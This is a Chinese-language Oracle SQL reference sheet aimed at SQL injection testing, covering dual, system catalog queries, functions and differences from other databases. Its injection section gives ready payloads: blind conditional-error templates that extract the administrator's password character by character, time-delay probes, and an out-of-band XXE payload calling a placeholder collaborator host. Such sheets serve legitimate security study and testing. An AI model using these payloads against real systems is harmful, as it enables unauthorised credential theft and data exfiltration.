# Oracle

## 基本信息

- 甲骨文公司商业数据库
- 默认端口：1521
- 注释符：`--`（单行）、`/**/`（多行）
- 字符串连接符：`||`
- 字符串定界符：单引号 `'`

## 关键特性：FROM dual

Oracle 强制要求 `SELECT` 语句必须有 `FROM` 子句。`dual` 是系统自带的单行单列虚拟表，用于无需真实表的查询：

```sql
SELECT 1 FROM dual;         -- 返回 1
SELECT 'test' FROM dual;    -- 返回 'test'
SELECT USER FROM dual;      -- 返回当前用户
```

**注入中的意义**：任何独立子查询都需要 `FROM dual`，忘记会报错。

## 连接与基本操作

```sql
-- 查看版本
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE ROWNUM=1;

-- 查看当前用户
SELECT USER FROM dual;
SELECT UID FROM dual;

-- 查看当前数据库
SELECT name FROM v$database;
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
```

## 查询系统信息

```sql
-- 列出所有表（当前用户）
SELECT table_name FROM user_tables;

-- 列出所有表（所有用户）
SELECT owner, table_name FROM all_tables;

-- 列出表中所有列
SELECT column_name, data_type FROM all_tab_columns WHERE table_name='USERS';
-- 注意：Oracle 中表名默认大写

-- 查看当前用户权限
SELECT * FROM user_role_privs;
```

## 常用函数

### 字符串操作

```sql
-- 取子字符串（position 从 1 开始）
SELECT SUBSTR('hello', 1, 2) FROM dual;    -- 'he'

-- 字符串长度
SELECT LENGTH('hello') FROM dual;           -- 5

-- 字符串连接
SELECT 'a' || 'b' FROM dual;               -- 'ab'
SELECT CONCAT('a', 'b') FROM dual;          -- 'ab'（仅支持两个参数）

-- 大小写
SELECT UPPER('hello') FROM dual;           -- 'HELLO'
SELECT LOWER('HELLO') FROM dual;           -- 'hello'

-- 查找位置
SELECT INSTR('hello', 'll') FROM dual;      -- 3
```

### 类型转换

```sql
-- CAST
SELECT CAST('123' AS NUMBER) FROM dual;

-- Oracle 特有
SELECT TO_CHAR(123) FROM dual;             -- 数字转字符串
SELECT TO_NUMBER('123') FROM dual;         -- 字符串转数字
SELECT TO_DATE('2024-01-01', 'YYYY-MM-DD') FROM dual;
```

### 时间函数

```sql
-- 延迟（PL/SQL 匿名块方式，需要权限）
BEGIN DBMS_LOCK.SLEEP(10); END;

-- SELECT 中可用的延迟函数（返回值，适合盲注）
SELECT DBMS_PIPE.RECEIVE_MESSAGE('a', 10) FROM dual;

-- 当前时间
SELECT SYSDATE FROM dual;
SELECT CURRENT_TIMESTAMP FROM dual;
```

### 条件表达式

```sql
SELECT CASE WHEN (1=1) THEN 'yes' ELSE 'no' END FROM dual;

-- Oracle 特有：DECODE（类似 CASE）
SELECT DECODE(value, 1, 'one', 2, 'two', 'other') FROM dual;
```

## SQL 注入相关特性

### 注入点探测

```sql
-- Oracle 指纹测试
' || (SELECT '' FROM dual) || '    -- 确认 Oracle
' || (SELECT '' FROM users WHERE ROWNUM=1) || '   -- 确认表存在
```

### 行限制（没有 LIMIT）

```sql
-- Oracle 使用 ROWNUM
SELECT * FROM users WHERE ROWNUM=1;

-- Oracle 12c+ 支持 FETCH
SELECT * FROM users FETCH FIRST 1 ROWS ONLY;
```

### 条件错误法（核心技巧）

Oracle 盲注中最常用的技巧，利用除零制造可控错误：

```sql
-- 基础模板
'||(SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

-- 验证用户存在
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- 判断长度
'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- 逐字符爆破
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**原理**：`CASE WHEN` 条件为真 → 执行 `TO_CHAR(1/0)` → 除零错误 → HTTP 500；条件为假 → 返回空串 → 无错误。

### 外带通信（OOB）

Oracle 支持通过 XML 函数发起外部请求：

```sql
-- XXE + SQL 外带
UNION SELECT EXTRACTVALUE(
    xmltype(
        '<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
            <!ENTITY % remote SYSTEM "http://collaborator-url/">
            %remote;
        ]>'
    ),
    '/l'
) FROM dual
```

### 多语句

Oracle 不支持 `;` 多语句执行，必须使用 `UNION SELECT` 或表达式注入。

## 与其他数据库的关键区别

| 特性 | Oracle | PostgreSQL | MySQL | MSSQL |
|------|--------|-----------|-------|-------|
| 虚拟表 | `FROM dual` 必需 | 不需要 | 不需要 | 不需要 |
| 行限制 | `ROWNUM` / `FETCH` | `LIMIT` | `LIMIT` | `TOP` |
| 表名大小写 | 默认大写 | 默认小写 | 大小写依赖 OS | 不敏感 |
| 错误制造 | `TO_CHAR(1/0)` | `CAST('x' AS int)` | `EXTRACTVALUE(1,CONCAT(0x7e,...))` | `CONVERT(int,'x')` |
| 多语句 | 不支持 | 依赖驱动 | 依赖驱动 | 支持（默认） |
| 字符串连接 | `\|\|` | `\|\|` | `CONCAT()` / 空格 | `+` |
| 延迟 | `DBMS_PIPE.RECEIVE_MESSAGE()` | `pg_sleep()` | `SLEEP()` | `WAITFOR DELAY` |
